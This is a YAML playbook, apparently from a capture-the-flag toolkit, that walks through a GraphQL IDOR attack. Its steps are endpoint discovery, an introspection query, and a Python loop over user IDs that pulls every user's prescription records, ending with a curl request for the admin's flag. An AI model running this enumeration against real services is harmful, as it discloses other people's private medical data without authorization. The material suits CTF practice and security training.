name: graphql_idor
category: web
tags: [graphql, idor, broken_authorization, information_disclosure]
indicators:
  - "GraphQL endpoint /graphql"
  - "GraphiQL interface enabled"
  - "Query accepts user_id parameter"
  - "No authentication or authorization check"

tricks:
  - name: "Step 1: Discover GraphQL endpoint"
    when: "First access"
    how: "Check /graphql or /graphiql for GraphQL interface"
    payload: |
      curl http://TARGET/graphql

  - name: "Step 2: Introspection query for schema"
    when: "Found GraphQL endpoint"
    how: "Use introspection to get all types and fields"
    payload: |
      { __schema { types { name fields { name } } } }

  - name: "Step 3: Identify IDOR vulnerability"
    when: "Analyzing schema"
    how: "Find queries accepting user_id without authorization"
    payload: |
      # Found: getPrescriptions(userId: Int) { id flag }
      # No authorization check on userId parameter

  - name: "Step 4: Enumerate user data"
    when: "Found IDOR vulnerability"
    how: "Iterate through user IDs to access other users' data"
    payload: |
      for uid in range(1, 100):
          query = f'{{ getPrescriptions(userId: {uid}) {{ id flag }} }}'
          resp = requests.post('http://TARGET/graphql', json={'query': query})

  - name: "Step 5: Extract the flag"
    when: "Found target user"
    how: "Query admin (user_id=1) prescriptions for flag"
    payload: |
      curl -X POST -H "Content-Type: application/json" \
        -d '{"query": "{ getPrescriptions(userId: 1) { id flag } }"}' \
        http://TARGET/graphql
      # FLAG in prescription flag field

